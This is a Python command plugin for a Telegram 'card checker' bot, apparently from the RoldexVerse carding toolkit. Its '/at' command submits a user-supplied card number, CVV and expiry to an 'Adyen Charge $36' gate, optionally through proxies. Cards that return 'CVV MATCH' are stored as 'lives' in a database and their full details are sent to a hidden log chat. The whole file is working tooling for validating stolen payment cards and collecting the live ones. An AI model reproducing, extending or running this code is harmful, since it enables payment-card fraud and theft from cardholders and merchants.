"""
≛ <b>Commands Available</b> ≛
──────────────────────
- <code>/at</code> cc cvv mes ano || <reply_to_msg>
➛ Adyen Charge $36
──────────────────────

©<a href="https://t.me/roldexverse">RoldexVerse</a>
"""


import os
import re
import time
import requests
from mills import LOG_CHAT

from mills.decorators import bot_cmd
from mills.func.tools import web_search
from mills.plugins.checkers.utils.gateinfo import get_gate_info
from mills.plugins import rand_user_base
from mills.plugins.checkers.utils.getcards  import get_cards
from mills.plugins._helpers.strings import get_strings
from mills.plugins.checkers.funcs.at_defs import at_def



@bot_cmd(cmd="at", text_only = True)
@get_gate_info("at")
@get_cards()
@get_strings("card_chk")
async def _at(m, gate_db, user_db, cards, lang):
    start_time = int(time.time())
    cc,mes,ano,cvv, bin_info = cards
    message = await m.reply(lang['fir_msg'].format(
        gate_name = gate_db['gate_name'],
        name = m.full_name(),
        id = m.sender_id,
        taken = int(time.time()) - start_time,
    ))
    r = requests.Session()
    if proxy:= await m.adb.get_key('use_proxy'):
        r.proxies = {'http': proxy, 'https': proxy}
    # ip = r.get('http://ip-api.com/json/').json()
    # print(ip['query'], ip['countryCode'])
    a = at_def(r,cc,mes,ano, cvv)
    r_respo, r_logo, r_text = a
    await message.edit(lang['fin_msg'].format(
        gate_name = gate_db['gate_name'],
        card = f"{cc}|{mes}|{ano}|{cvv}",
        status = r_text,
        logo = r_logo,
        message = r_respo ,
        vendor = bin_info['vendor'],
        type = bin_info['type'],
        bank_name = bin_info['bank_name'],
        country = bin_info['iso'],
        flag = bin_info['flag'],
        name = m.full_name(),
        id = m.sender_id,
        role = user_db['role'],
        taken = int(time.time()) - start_time,
    ), link_preview = False)
    if r_respo == "CVV MATCH":
        if user_db['saveccs']:
            await m.mdb.update_one('users',{'_id': m.sender_id}, {'$addToSet': {'lives': f"{cc}|{mes}|{ano}|{cvv} - {r_text} - {gate_db['gate_name']}"}})
        m.save_lives(f"{cc}|{mes}|{ano}|{cvv} - {r_text} - {gate_db['gate_name']}")
        await m.client.send_message(LOG_CHAT, f"{cc}|{mes}|{ano}|{cvv} - {r_text} - {gate_db['gate_name']}")
    await m.adb.set_key(f'antispam_{str(m.sender_id)}', time.time())
    return